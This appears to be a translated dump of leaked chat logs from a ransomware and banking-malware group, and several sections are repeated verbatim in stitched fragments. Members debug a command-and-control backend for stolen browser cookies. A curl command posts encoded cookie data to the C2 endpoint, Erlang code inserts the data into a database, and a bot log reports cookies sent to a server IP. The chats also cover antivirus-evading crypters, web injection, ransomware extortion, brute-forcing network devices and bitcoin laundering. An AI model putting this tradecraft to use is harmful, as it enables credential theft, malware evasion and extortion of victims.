Both are logical.
will not do .
And there's new fields added to the 90 command.
did you change the base on the worker already ? can i dump ?
the fields will not be saved if there are more of them ?
dlls, programs, services I already added.
Oh, okay.
I haven't done it yet. I'll do it in a second.
I need a desktop shortcut field there but I haven't added it to the migration yet.
It's not in the back either.
Add it all at once so I don't have to come back.
Not yet. I will have time later this evening.
There need to add this field in other parts, so I will not be able to do it quickly.
I've set 2 fields in my cookies to migrate.
Here is the question. Why can it be that I make a request, back answers /1/ but in the info level logs no request, while in the database of the data I passed, too.
It is written in back that /1/ is always about the answer 200, but I noticed that it answers /1/ both if the bot is in the database and if it is not.
good question, but zulas isn't on the board anymore
so do that question again when it comes up.
Ok, so there's no history here...
no
in order not to constantly go to the confab after the re-login at the top there is an asterisk, press twice and select auto-entry - always
then when the confab will not be relevant remove the asterisk

What's the deal with Prof.
He's not happy.
♪ send me a list of his projects ♪
he doesn't seem to have any emotion
nothing is done
and even 2 weeks changing servers for abuses on the anchor

[20:07:20] <professor> did you see how they obfacated ?
[20:07:24] <professor> about the affiliation ?
[20:07:30] <professor> i almost fucking burst the fuck out
[20:07:37] <professor> they cut a piece of trikbot code that's responsible for tapping on CIS
[20:07:41] <professor> into the diabolus build

[20:07:48] <professor> although I specifically asked not to touch the task with the definition of geo
[20:07:58] <professor> and immediately the whole project appeared in the news as fully affiliated
[20:08:34] <professor> https://www.securitylab.ru/news/523552.php
and who approved it ?

Hi, only three ready, my mistake, I ordered everything from one host, there issuance almost immediately, but they eventually ran out of servers and now the account manager is waiting for him to issue a replacement, in a day

Ionita Laurentiu
Unfortunately, the server that you ordered is not available in our stock. An account manager will contact you during today with similar servers that we have available and it will be delivered to you immediately.

[23:55:29] *** Your message was not sent. Either end your private conversation, or restart it.
[23:55:29] <mango> And to fuck with these cocksuckers - you can add that we'll give him this kopeck to support himself, so he won't starve to death, because he's unlikely to earn anything himself
A goodwill gesture for the stupid and penniless
Let the whole forum talk about it.
Such motherfuckers only have to design a calculator, that's all they're good for.
You can add that as a quote from the chief.

Yes, that's how it is.

Oh, okay.
I haven't rolled it in yet, I'll do it in a sec.

Okay), when you find a candidate, where do you send him?
I just dropped 5k.
the fields will not be saved if there are more?
dlls, programs, services I already added too
Oh, okay.
Haven't pumped it yet, I'll do it in a sec.
There's a field for desktop shortcuts I need more, but I haven't added it to the migration yet.
It's not in the back either.
Add it all at once so I don't have to come back.
Not yet. I will have time later this evening.
There need to add this field in other parts, so I will not be able to do it quickly.
I've set 2 fields in my cookies to migrate.
Here is the question. Why can it be that I make a request, back answers /1/ but in the info level logs no request, while in the database of the data I passed, too.
It is written in back that /1/ is always about the answer 200, but I noticed that it answers /1/ both if the bot is in the database and if it is not.
good question, but zulas isn't on the board anymore
so do that question again when it comes up.
Ok, so there's no history here...
no
in order not to constantly go to the confab after the re-login at the top there is an asterisk, press twice and select auto-entry - always
then when the confab will not be relevant remove the asterisk
 > such a question is. Why can it be that I make a request, back to me answers /1/ but in the logs level info request is not, while in the database of the data that I sent, too, no.
It is written in back that /1/ is always about the answer 200, but I noticed that he answers /1/ and if the bot is in the database and if it is not.

first of all what is the request ? can we repeat it on the current system so I can see it ?

Unfortunately we can not.
If with this server will be the same story I will write

Hi
Rocket's lying around for now.
Make four proto2 vpc's.
Hi. Rocket is not working.
@driver let's be specific about what you need and where ... ok ?
You need to put 2 fields in 84 command.
Secure, httponly at the end of the reception, it turns out the 9th and 10th field should be.
At the request of the form
curl -X POST -F 'data=dXNlcg==|IE||||1240428288|1240428288|dXNlcg==|IE|demdex.net|ZGVtZGV4|NTczODQzMjMyMTAwNDg1MDEyMDI3NjIxMTIxODA0ODI1OTMyMjQ=|1240428358|1240428358|Lw==|1|1' http://(IP)/TAG/TEST_W639600.1234A242341C6D1A25B3F315D688968E/84/
The answer should be /1/.
ok ... are the fields in the database now ?
Yes
and the old clients still work ?
i.e. have to support both the old format and the new one ?
No, just the new one should start working.
Already made the necessary changes for clients. We are waiting to pick up these changes part of the back
zulas: I really ask you to hurry up, because now a lot of people depend on you, without fixing the backend can not go on
Alright, I'll do it.

Thanks. You too.
How was the Crimea?
Did you like it?
like that.)

It's nice, but for sure all shit is terrible, no roads, I thought I'd have no wheels))
My 22 rims were upset:)
in the Crimea on such wheels is not an option to ride
at all)
Yeah
So on the whole, of course, it's OK there.
I haven't been there in 10 years
But there's bullshit everywhere, the pink lake is not so pink, the Maldives in Crimea is not the Maldives at all.)

The balaclava is great from the water.
We'll have to go next year to check it out.
Russian Crimea)
It's a little early. Wait a minute.
It will take at least 2 or 3 years, I think.
The roads are still being built.)
But there are global construction projects everywhere.
So we'll wait for the civilians.)
They're putting a lot of fucking money into it, of course.
i think it will be no worse than in new sochi...
i know that's what i've been told.
it takes time

hi, tom asked for more data on bluehost.com, getting ready
On cpanel he worked it all out, there were a lot of duplicates, a lot, so I gave him everything
this is what he got accs 531 / domains 53
complains that there is no one to work out the grids, not enough hands
Hey, Bro.
Nothing has changed for the better in terms of work
Please give at least some kind of report
2-3-4-5 days
No shit.
added to the 5 chats
Even though I know that there are many more networks in my work ...
Everyone says we are busy
We're busy.
I feel like a beggar... give me information .... give me the information.
No one gives a fuck.
I will sell the nets that are not marked in any way that are in work or not in work.
5 I will not touch.
I'm not gonna touch the ones I have.
I will continue to work with you ... when we figure out how we can work transparently.
I don't doubt at all that there's no cheating on your part or that of your team...
...but there's definitely some fucked-up attitude on the part of the hackers.
I'm asking how you're doing... The network's down.
It's a 41kk grid.
You can't rebuild it out of the zapper...
Oh, I don't know.
Give me access
that's it.
the network is fuckin' great... no
fuck it!
someone else will give you more bots
It's not the quality, it's the quantity
I can't work that way, every bot is worth its weight in gold

Hello, I work hard on the messenger design, now I will send the final result to the guys and we will move on to the next sections) the idea is interesting in my opinion - paid "likes". that is, in the news/articles section, people write posts, the post can comment on, or put a "Like". Like Like will be in the form of coins, and clicking on it will automatically deduct a dollar from your balance say) so the likes will be honest, and the person who wrote nice) such as an element of friendliness and adequacy in a world of internet freaks :D

Hi, there is nothing new. Crypto. The workload is heavy, although the buildmachine helps out, but the purges, of course, remained.

 For the spam bot added functionality to send outlook address book data to the server and made it cross-bit. I gave the cross-bit version to the customer.  For the cryptor, I periodically clean it up and redid the method of encrypting the payload. Currently working on removing crt libraries from the crypter code.

Hi, if you're gonna be here let me know.
I have a lot of problems with the vntz injector and the antic.
I've got Veldon working on the antic, removing hanks and bugs, checking if the project will work.
The injector for vntz:
Problem with some sites not loading, or loading in the wrong form, related to the insertion of our code in html.
As a result a lot of ssl certificates and cache are created and some of them are updated and some are not.
The criteria of such behavior are unknown, which leads to difficulties in reconstructing a problematic situation on the test machine.
As a result, if chrome did not update the cache, our certificate does not fit it and some pieces are normally picked up and some are not, and a conflict occurs resulting in a page breakage.
This has to be checked with the config coder.
Today Jaime also built a build to fight privacy error, Robin will send me the addresses to check.
Otherwise, no big changes so far.
Well, there were also problems with detects on triples, but that has been overcome for the moment, today triple without them.

I gave the stubs to Bentley, he did crypts through them for a while, said they worked well, now, I will add these stubs to the panel, will be on the type of their profiles for all loads. I'm going to make a slope on the profile under the trike, since they didn't notice that profile. This will reduce the load on the other profiles and speed up the issuance of crypt files

Hello

I'm ready to work. Solana is written on rasta. I want to work on rasta, so I can use it to my advantage - to work on solana.

hi
I did not put it
I'm done, so to speak.
Hi I got it fine
what cryptors would you single out?
Which one do you communicate with directly?
Hi. Okay.
Hi. Great.
I've contacted ford@ and viper@.
what's your schedule like when you're online ?
Is there a regular time?
So what's up with solana?
hold on
couple of minutes.
Hey. .
It's not that with Solana.
I thought I had some experience
rast by itself is good for writing loaaders and other malware)
it's not C++ and it's worse to analyze manually or automatically
why is it worse? ) well, the same as cm code
maybe analysis tools are not so well written ... well they will be
this is a known fact
I don't want to write a mumbo jumbo... )
rust go nim and even c#
a smallware on charp -- it's like going to space with basics ... it has a fat timing ... i don't need it
so where can i use your rast?
in writing a malware.
what's wrong with raster?
it's all bullshit.)
google is promoting it to linus, go ahead man, write a kernel on it
but you don't use it for any of your projects.)
Fucking saboteurs!
google has golang )
even worse golang
fuckin' hell
what's not?
i didn't even think ritchie would get that dirty.
c.
Oh, so you're a retired C-man.)
I'm a realist.
so what's the pooch then?
low mileage
the quality of the language itself isn't even important, just like for go
all the problems i had were with the unstable and immature ecosystem
it's not ready for sale despite all the cheeks puffing
and erlang ?
i don't know much about it after all these years
i think it's very effective
well ... high mileage ... but it's also a piece of shit as you understand it)
no he is not.
so why do not you have the task of writing something new?
the reason is simple
it is an exotic, for which there are no specialists on the market
they are simply not available
and for php it's nine seventy a kilo
the same is true for any exotic - recruiting people
here i am) and no tasks
to grow and to go
well ... go is not exotic compared to rast ... but i'm attracted to rast
it's probably because it's exotic
I'll get to grips with Haskel when I retire... that's where it's exotic - exotic
so what's new in erl? )
i'd rather give you the task of training people in erl
here you go
i'll say it again about the exotic.
i'm recruiting all the time, i'm confronted with the laws of the market
and i've been in it a long time, a very long time
there's a developer's desire for new and interesting things
and there are laws of evolution
according to the laws of evolution, well-proven solutions are in demand, tested by time, from which all unnecessary things have fallen away
like the wheel or the kobol
new exotics come and go, just like species
the one that proves itself, it stays on the market.
kobol is in demand - because there is a lot of legacy in the banks ) and bearded specks rule there ... i will be like that in 30 years .)
it's exactly the same with the erlang.
as it is with cobol.
the same situation with erlang and kobol. as for training - it is possible to train, but it is expensive because i am actually training my competitors )
No ... the Earl is the most alive ...
if it's hipster - elixir)
it was good in its day, but now there is no one on the market for it and it is legacy
for example node.js - it appeared, it's established itself, it's on par with pcp now
it's all the same
it's the same boring shit ... can node parallelize ? ... and javascript is such a fucked up thing ) unsupported
what one guy writes - the other guy can't even maintain it)
no one cares what the language can do ?
only cares where to get a person to use it
if there's a resume for it, that's fine.
if not, the language won't be in demand
no one cares --- if you hammer nails with a microscope --- you won't get far
hye
yo
a ce ti ni kami ne govoil?
man
what cryptors would you highlight?
Hi I got it fine
which one do you communicate directly with yourself?
it's better to have a very bad language with very cheap specialists than a very good one with few specialists
I agree with you ... but if you think like that ... only the SI would be the most alive
i am telling you the real logic, that i and all recruiter's follow
yeah i understand ...
Of course it's possible to write websites on node) but to make a normal service... there's a responsible approach
what about elixir? it's the same as erlang
hi great
i checked with ford@ and viper@
what is your schedule when you are online?
is there a stable time ?
i don't know anything about him.
it's weird. he's more in the hot zone than Earl.
it's the same as Earl, but from the side... read it...)
kind of modern.
hi
so what's up with rasta --- it's worthless? )
i told you
it's good as an exotic in smallwares
smallwares aren't for me ... where can we find more intersecting points for each other?
what do you think your backend is for?
to collect some data ... but i'm not interested in that .
i'm not writing a client. so technically my hands are white.)
 https://privatlab.com/s/v/3Qn2ErZ42oHzB9rLoY9l
Aw;6?9w:@2
updated messenger screens with a payment window)
I'll think about it.
so you do not want to get your hands dirty )
here's a question
how is your DBMS?
standard ) with Scul ... all kinds of storages not very good . it is not my thing
I don't think a DB should contain business logic
I need a specialist in subdatabases
and on different ones, on lots of them, with good experience
should I be able to make a few parameters?
no
bigdata

Hi. How's it going?
What are your results?
What are the challenges?
What ideas are there to add and improve?
Are there any of us who consider ourselves blockchain gurus, and trends. Who might know where to go in this direction and what to develop... What ideas anyone has.
1) we want to create our own crypto system like:
etherium, polkadot and binance smart chain etc.

2) Does anyone know about this in detail?

3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So, other already created their own coins, exchanges and projects on our system.
How do you do, how successful is someone, what ideas do you have?
Hi, about the blockchain - I did a little bit.
There's a blockchain with an issuer. No mining, could roll in for circulation of various liabilities, like square footage of a developer, etc.

Hi, about the blockchain - I've done a little bit.
Anyway, there's a blockchain with an issuer. No mining, can roll in for circulation of various liabilities, like square footage of a developer, etc.
Or such an application - there's a city, it has taxes and budget spending, and let's say there's no money. The city pays the city's budgeted obligations in a token. Then levies them on businesses in taxes. The business can get them from the budget holder and swaps them for all sorts of nifty stuff.

they're insured.

so we wait.

So there's going to be bidding with the insurance company?
No. .
That's not how it works.
They have a coverage budget.
We just take it and that's it.

I don't know what it is.)
Wait, it's okay.
and what's up?
they're gonna ask for a decryption.
the test one
then a list of the date that we stole
and then we'll come to a consensus
on how much money they owe us
)))
All right, we're just waiting.
Got it.)
is the second one still in the works?
or all with it already?
and also can it be that they should not?
Can there be a date to put it up for auction
All that's left to do is to keep our fingers crossed and wait.
Time will tell.

I just announced the requirements.

and told them how much they leaked the dates
They should give us the files for test decryption and ask for a list of what we've stolen
Copy that. .
Keep me posted.
I'll let you know when they ask for it
what's the payment sentiment there
It's most likely that there's a recalcitrant
communicating
with us and not them.
[ERROR: This message is encrypted, and you are unable to decrypt it.]

It's good that they're communicating.

Hi. How's it going?
What are your results?
What are the challenges?
What ideas are there to add and improve?
Are there any of us who consider ourselves blockchain gurus, and trends. Who might know where to go in this direction and what to develop... What ideas anyone has.
1) we want to create our own crypto system like:
etherium, polkadot and binance smart chain etc.

2) Does anyone know about this in detail?

3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So, other already created their own coins, exchanges and projects on our system.
Tell us how you are doing, what success, may be there are some ideas?

Yeah, I'm the second backender.

Uh, probably not.

[15.09.2021 20:10:22] <defender> send it to zoolas and ask what's wrong with it
I work with the driver
in short if it comes to the processing of 84 command ... then forbidden can only be here:

this means either you have a big request body or the transit time is long.
the request flies away fast
Maybe it won't get here at all.
The body is not very good, too.
request size ?

That's not it then.
There was some kind of an update, they said.
Maybe the parameters are different
or something
There's also forbidden here: _ ->
 reply(forbidden, Req0) ... it's when the URL is incorrect, but yours seems to be correct
Can you check the logs?) or you also do not have access)

You need to look at the logs, it will tell you more specifically there
There may be in several places
Either there is a runtime error ... Or in CSV wrong format
Please check it. The driver says he was able to send normally. Maybe it depends on which server the pad is pointing to or something else
you have 8 columns in the csv ?
Did I do the math right?
I discounted the old request, but the new one has 10 fields and the same error comes in.

New format:
<b64(Username)>|<Browser>|<b64(Domain)|<b64(Cookie_name)>|<b64(Cookie_value)>|
        <Created,unix,Sec>|<Expires,unix,Sec>|<b64(Path)>|<IsSecure>|<IsHttpOnly>
Sec. I'll look for a new request.

Hi. Here?
I don't know.
You need to look at the logs.
Maybe there's an error.
We had problems with B64 and utf8.
It writes the data as it is. It's all textual.
I can't deal with it right now ... probably next week ... so try to get to my log ... if it shows up ... I'll try to fix it
quickly...
I do not need to deal with, I'm on vacation))
But to fix the problem with the format would be nice.
Besides you someone else fixes the source?
no
at least def can look at the logs.

admin says it's going to this server through the seal, everything's fine
there is something strange.
I found it by URL ... then I cleaned the log ... I queried again. The URL does not find it.
We have to restart the service.
It doesn't write logs after deleting files
or what
He writes
When he was in the log ... there was a error in the libs again
which works with POST data
Something is waiting for one thing and something else is inside.
in general i had sat down and updated all libs to the latest version . it would be easier then ... but it will be done later

Hi.

I got sick. Covid.
I got sick last Tuesday.
Until Friday I worked with a fever - everyone needs crypts.
But I don't have the strength anymore. I'm sorry, but I'm not an employee yet.
The test came back positive. And my sense of smell is completely gone this morning.
I'm writing you off because I don't know what will happen to me by Monday.
If I'm able, I'll write on Monday.
Would you be so kind as to write to Franz and Bentley? Collin still needs to be informed. Thank you.

hello
again the server didn't extend one

what's the problem?
on sms-activate.ru can you throw more?
here is observed, because the country of the phone should be the same as the ip, and because our server states, sms-activate.ru somehow low yield for the states, and I think - but do not put us, say, nordvpn there and try different countries, the maximum yield will build up the mail of this country, huh?

Fuck, I promised him I'd check it today and tell him the result.

It's okay to say that.

Hi ... i don't know what to fix. Your guys are changing the client . They have something wrong ... and i have to figure it out and fix it myself. Don't you think something is wrong? For five years it was working, and then it "broke on my end" ...
they added fields.
They wrote about it in the confab.
You just don't want to get into the problem.
I added the fields.
Talk to spectrum.
He'll give you the details.

hi
Yeah, the number of fields is different there.
I'm guessing the database needs to be fixed.
He can't convert.
I did.
There's still a query error.
Just for the parsing of the fields.
Mismatch parameters count!
I looked at the code in the git.
It matched.
what do you mean ?
case binary:split(Row, <<"|">>, [ global ]) of
					[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ] ->
						SQL = "INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( NOW(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13 )"
						{ok, _ } = db:equery(SQL, [ Group, IdLow, IdHigh, base64:decode(Username), Browser, base64:decode(Domain), base64:decode(Cookie_name), base64:decode(Cookie_value), Created, Expires, base64:decode(Path), binary_to_integer(Secure), binary_to_integer(HttpOnly) ]);
					Any ->
						lager:warning("Bad format of CSV row: ~p", [ Any ]),
						throw(reply(missing_parameters, Req2))
				end
here is an error
I see what's going on there ... you can see it in the log .
I think I know what the fuck is going on.
[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ]
this is bullshit . it can't match what came with what's needed .
Something else is coming in. More than 10 columns.
less comes in.
And it needs to be added to the bot.
to make the empty fields like || saw.
Right?
And any action causes a 403 error there.
Even if half of it is fine.
Well the number of columns should be 10.
If there is even one error in the general query, it will return 403?
I got that right.
What do you mean by error?
Well, the action will finish
processing
Well any action will of course terminate
throw(reply(missing_parameters, Req2))
Yes ...
That's it, it's clear now.
The error is not there.
I see you're becoming an Erlanger.)
what to do
i was promised pxp in general))))
syntax is a bitch, just like python)
so what's next in your investigation?
the syntax is super )
well, i like GO better
you need to check for empty fields, and if there's no field, it should just write a slash
instead of skipping
in any situation we need to look at the logs
like in the query I was given
in your software?
no
who sends this data?
Yeah, I guess so. 10 columns is the best.
but they send 6 or 10 or whatever and half of them are correct
[21:18:40] <mango> there's a guy with nets from 5 to 9k - take it?
and i didn't check that he's crashing in any case, not just skipping data
well, in short, the bourrats themselves
borats
yeah
well it is possible to skip the data
but will it help?
better to standardize
but bad queries should be ignored of course
instead of being dumped into the action
That's essentially ignoring it.
The answer to the client is fuck off.)
some of the data is valid.
okay, i'll talk to them tomorrow about what's best
if anything, we'll just remove the expression and that's it.
We'll just leave an error in the log.
I can process all data ... just the CSV assumes that the number of columns is the same for all data
Well, they have to guarantee that.

Hi
By the way, I think there, Adam said that there was something wrong with the dedic. I had made a couple of dedicates before that boby, but those were for linux, and all according to rocco's manual. Yours was a Windows one -- I did it all the same way. Basically the same, only one difference -- VeraCrypt instead of LUKS for the container. What else was wrong with it?

Hi.
Hello?
Hi. Yeah.
My informant that we work with on the payments sent me a message.
Please let your team understand that using the Suex exchange will cause a lot of issues.  

I can see conversations associated with this going forward.
Tell everyone who's in Conti
Ladas, of course.
did the cartoon send you?
Who's a cartoonist?
it's not like there's anybody there.
Spaniard
He's Romanian, though.)
No, he's not.
He's a negotiator.
I don't know why everyone calls him a Spaniard.
I get it.
I'll pass it on, thanks.
He's a canadian from a big rec company.
Does your crew wash the bits before they're distributed?
Mixers or something.
No. .
I get it.
It doesn't make sense.
We will make our own mixer for our needs in the future.
there is if you do it right
They're tracking bits like hell right now.
have you ever had a note that the locke deleted in the quarantine?
it is understandable
yes but we should just turn off the AV
You've got to be one step ahead of the curve...
we don't need to cache the bits)
but to save
When will it be 100k already?))) I'm fucking tired of saving
i'm adding and adding, but the amount doesn't change :-D
Get the Spaniard to do a security report on Liberty Reserve
Okay, I'll give him a shake.
Hi.
Please let your team understand that using the Suex exchange will cause a lot of issues.  

I can see conversations associated with this going forward.
Hi, will there be nothing to do?
hi
Stand down for now.
The module coder is out.
Hi there is klaus he is in the interview chat room waiting for an interview
He's for hash
Interview him.

Hi. How's it going?
What are your results?
What are the challenges?
What ideas are there to add and improve?
Are there any of us who consider ourselves blockchain gurus, and trends. Who might know where to go in this direction and what to develop... What ideas anyone has.
1) we want to create our own crypto system like:
etherium, polkadot and binance smart chain etc.

2) Does anyone know about this in detail?

3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So, other already created their own coins, exchanges and projects on our system.
Tell us how you are doing, what success, maybe there are some ideas?

Look, I do not understand you. You made a commitment on Thursday that you'll finish by the evening.
Then you unilaterally broke it and wrote that you'd do it on Friday.
It's Monday night, you wrote two hours ago that you'd do it now.

Where's the bottom line? How are we going to work with you from now on? I don't like that I have to stand with a stick and write to you, in the spirit of where, when, whom?
I count on independence and responsibility, I have a full carload of tasks, if in your face I can not get help, and will allocate separate resources for this process, it will not help the common cause.
On our part, you are all given, if you have any questions you can always write.
I will do my part to fulfill the part that you have undertaken.

hi, yesterday francis said that because of the complaint my salary is in question now and need to write to you. last week frank asked to extend his two test servers, they were not in the extension, because in August he said "...see..." about them, I do not remember exactly. i paid for these servers and they were 10min turned on all ok. i think the next day i wrote defender that frank complained about me and generally these servers important. i explained him the situation also, about their importance i first told defender himself, agreed that i would extend and ask customers about the extension when ordering, there was no showdown, with frank dialogue besides the extension was no more, only he apparently also wrote to francis, who sent me to you. before that there were also situations, but I took action, did a month inventory, tear down the system, updated all the lists, no problems. with frank's servers my responsibility, I should have gone to him myself, but I did not think they were needed at all

Hi, I'm writing you off. Our old case was renewed, the investigator said why it was renewed, the Americans officially requested information on Russian hackers, not only us, but in general who was caught around the country. In fact, they are interested in the trickbot, and some other viruses.
We were summoned by the investigator next Tuesday for a talk, but sort of as witnesses for now. But we'll be on 51 for now.
Also, as the investigator said, the case was extended until the end of October, that would hold a conversation with us. Because if the case is suspended, we can't be interrogated in any way, and in fact because of this they resumed it.  We have already contacted our lawyers.

Question: Could I get my salary? What would it take for me to extend my lawyer and take a vacation until the end of October? To get all this bullshit sorted out. The only thing is, I'll come by and give out routers every day. I give them out to thunder and def.

please send me my paycheck, my wallet

[14:17:59] <kagas> Hey, I'm sorry I got mad at you. I snapped at you, it's just family problems, sorting them out. The result on people will do. Now even fixed the chat, actively engaged in people.
Just no offense, sorry if anything. Can you please send me the second part of the salary if it's not difficult? I just to pay for the loan.
As stern will be, I'll write him that you discounted zp, but as if you were against it. He and I have a good rapport. It's not like it's the first day we've worked together.


Well, Chief, you are the one who is playing this game, you feel sorry for everyone, and they get used to it and sit on your neck. You should be online more often, and in some situations you should be tougher on them for educational purposes.

And then it turns out we are playing bad cop/good cop here, I fuss here, fuck all their brains to make them all work, scold when I see that there is no result, and then you are such a pie come and feel sorry for them all, warm, although the result from them is not. Everyone will get used to the fact that you can cry to Stern, and he will forgive you and give you money. I'm not going to teach you, you know everything yourself, I just reminded you once again.

[Error: message encrypted and can't be decrypted.]
It's most likely a honi.
I'm looking at the system
 	Microsoft Windows 7 Professional
normal send
 	Windows 7 x64 SP1
it is possible, but they say that almost no one
knock on the driver, he will send you the idi who sent
he's looking at the import logs right now
He sent it to me.
what do you mean no data?
Not a single module?
Yeah.
Contact love.
How do I download the log from the admin area?
Hi

It says it's not coming from these honeys.
But it's weird that they're getting into the pink one somehow.
I wonder how?
some kind of data come?
don't forget about the soxes! i found a half alive one while it's encrypted
[Error: message encrypted and cannot be decrypted.]
soxes are done.
run your test ones to check if the data is sent from the modules
https://dnog7cgicmkrvugrfxexo34gikjbr54sd5skxj4r42aj4tuy2hjsw6qd.onion
what's hany in the pink, i think a long time ago mavelec did the appearance of bots there even empty
and run on the 3rd
the default in the 2nd for example, only those who have sent at least something get into the pink
ran the test one
LAPTOP-PC_W617601.15D4F2F3B95FBD39BBD4993FA177359D
 	Successfully sent 'COOKIES' of 'Firefox' to server: http://203.80.170.81:443
pwgrab sent the data
so what's the majority of hanyou get?
hi

bot can not send Microsoft Windows 7 Professional
That's one example.
and the rest

what is their importance?

hi
omemo est?
sdelaju na dnyah
)
the one I watched has 37
so they've learned to knock all the time
and receive modules
but not send anything
it's been like that for a long time
I have seen these bots for a long time
need to invent a defense against them
how to enable it only do not understand)

Hi
I tweaked the code there a little bit, I uploaded it to the git, check it out too.
This is a question you got what you did worked?
I poured on one admin in the work, and the second while testing do not want to touch.
Hi
Finally finished the second cookie format because there were changes, check if everything works for you
+= means a = a + b; //
You didn't specify the field in the sample.
And this one, there was a gigantic number in the output
I'll probably have to do a test next week to figure out what's wrong with the code.
I'm thinking how could we make autotests on all this folk's creations, even by hand or how... But that's probably for later too... I'll make redmine and backlog all my backlog tasks as soon as time is right.

I got it. We'll wait then. My patience is a little shaken.
How is it shaken? It's not like we're in a factory.
We've been paid for almost a year, but no one's been working.
It shook in terms of getting a new job or waiting here for work.  I have no extra income. And the fact that they almost didn't work for a year, it's not up to me. In turn,I am in touch and ready to immediately perform the tasks assigned.

Something's messing with the exchange rate.)
You know anything about crypto?
Do you know anything about blockchain in general?
I track the price from the first second and can place a buy. There's no risk for say 100 bucks. But in the worst case you could sell it for twice as much.
Let me give you 2k.

I read the blockchain. And watched the codes. But not a theorist.
We need a lot of blockchain people.

hi
3ESoHu87mTrFNSNUaMVEfT3vYwRYGfSHQ
there will be a stock exchange and you can make coins for the teams and a lot more
drop me a line after you read it
I have the experience of being completely free with my time and spending it on programming makes me happy.
I have recently become very fond of our team.
It's okay for those who work.
Are you in the details on blockchain?
there are guys who came in six months ago and already make more money than me)
it depends on what you do.
Don't be jealous.
I'm only glad
i gave them all a raise)
Wait a while and the money will cease to exist for us.
It's just a number you can inflate however you want.
I don't mean envy.
you believe in crypto, don't you?
Write your thoughts in the form of a report.
darknet calculation.
It's just that our collective has a super-perspective for development.
I know that crypto's not regulated until it goes into fiat.
how do you see the security theme for such a platform and what would be the weaknesses
it depends on how you withdraw.
and so any number of people can be linked into working collectives
yup
if you have any friends you can get involved with.
who's fun to work with
The only place where you can boost crypto-exchanges.
And you can mine.
My boss said so.
You could do projects and liquify them in tokens.
The main thing is to make them in tokens, it's brilliant, but it requires a lot of effort.
I like to make a social network first of all for myself and the community, in order to replace obsolete sites and so on and so forth.
My hobby does not require anything. I just want to make quick transactions.
And we will develop it as a commercial project with support, should become like carbon black antivirus - only for hackers)
I've read the chef's whole thing. And so has Buzu. I'm all for it. I'd like to be in it for the rest of my life.
Here we go.
A commercial crypto project - if you're an expert, that's ridiculous.
once you read it, take the initiative.
Crypto is not a substitute for money.
He rarely offers anything himself, but he likes someone who cares, and someone who takes the initiative.
We need good teammates who know how to set goals, although they have been good friends with 3 yap
there is a lot to do and no one to work with))))
So the initiative takes time. I program the bots honestly. I got Dane's (Van) texts. I'm immersed in them now. I'm optimizing them now.
you only do crypto, right?
Jap -- languages?
are you talking about bk or tric?)
Yeah. .
I don't do crypt, I do bk.
You build build builds, don't you?
not stupid, but creative.
bk is a weak project frankly
all the adverts are complaining
There are constant updates from Collin. And there is a real movement.
The tricks are so weak there are a lot of detects.
The very subject of bots also beautiful.
Collin's a good guy.
I wish we had 10 more like him.
That'd be great.
He's very good.
If you got any good friends, bring 'em too.
We will.
With different skills for different tasks.
Don't you push me away. I'm yours.
I don't need money.
I need people for blockchain.
It's all just some kind of kinky fantasy, but it's real.
and the boss seems to approve of all this spending.
it seems to be either self-made according to the classics, or you have to do it on smart contracts by vu Buterin on the air?
how did you choose?
what is the closest to you in terms of blockchain and social networks?
we'll take from ubutik.
When I was drafted, I did a little research, got some projects to try out. I got fed up and forgot. This is what we need to be specific to support.
The task is to make a social network with a username and a password, a private key, and you as a hacker all in one site. Once everything is nice on the site, we will make an application out of it. You will not be limited in terms of functionality.
Here is the timing of trading on the stock exchange and the speed of spreading signals rnovosti-that is concrete.
There are spheres, you can download and launch, and you are a hacker.)
Who was the first to know and shoot, he takes the bank.
I'm not about the money again, but about the technical idea.
I get it.
And the Cheyenne platform and services are awesome.
you should probably go to baguette to support the crypto exchange.
It is not clear just how they decentralize and quickly search through all distributed blocks.
It is necessary to experiment and feel.
Everything is there for that
Yes, I have experience is the son of mistakes of the game. But I'm only in terms of learning.
I also have a goal and practice a powerful development complex.
A lot of machines a lot of providers in the apartment. Monitors, memory, speed.
Do you do the nets?
I love it.
If you want a lot of money, all the money is in the grids.
I want the algorithms themselves to talk to each other 24/7.
No, I'm not hacking.
do the nets pulses there fortiki ciski
I'm building
they can be brute-force on good hardware
I used to spoof when traffic was expensive and they stole 200 bucks from me.
and there's 2 or 3k from one net and 25% of the success just for giving you access
I had the whole house supporting me. Without knowing it
not 2-3k
all the money is in the nets bro
here osinty help us a lot of things to do, chats there taken care of and all this az 1%. but they and the percentage are happy) there on 5-10k they flies from the grid
Shit. I wanted to bet 30 bucks today. Just as a probe, to see if there's any movement in their records. When it hits the exchange, when the order is realized.
And I wonder, when the multiplier on this listing got to x6000, how much would I sell these 10 contracts for?
I mean, at 400, that's x100.
So how much would I have ended up paying?)
That's why I have to be kept close to the capital turnover.
not for how much. I did not put a prokshchena not yet. Observing. I have.
So far only telegram confidently scanning and scraping Binance news site.
you're doing it all wrong))))
Issuing a warrant is a one-time thing. There's nothing to do. But the timing has to be right. I'm timing it.
It's a hobby.
I just told you about the listing. You have no information about what's going on there. How the organizers distribute fake stuff for pennies, how then a small crowd of 500 slots come to trade, how it all sinks into the exchange.
well
it's a harsh world))))
early bird gets first dibs...
https://trade.kucoin.com/SOLR-USDT
here's an illustration
The point is not to be the master of the world, but to be there at every leap.
And to know that it is always easy and legal to take (as much as you want).
By sous vide watching the fight, not participating
But blockchain I'd participate in the scrum too. The topic itself is fire. Frantic!
Dex and everything else. Gaming, information systems
I find it funny when politicians discuss how swift is going to screw us and how hard it is to import it. It takes a long time to pay, it costs a lot. Do they have no programmers at all?
Of course
There's only a handful of smart guys
The rest are more like clingers
and there are grown-ups sitting there, they're talking about developing the industry... so you have to do it.
It seems to me that politicians and bosses don't do anything.
If you want to take part, write a report about what the topic is close to, why it's close, what are the perspectives, and how we can use it in a social network for darknetworkers)
Compared to bitcoin whales
they say what they are told)
you are so smart
what's the forecast for November bitcoin/ether
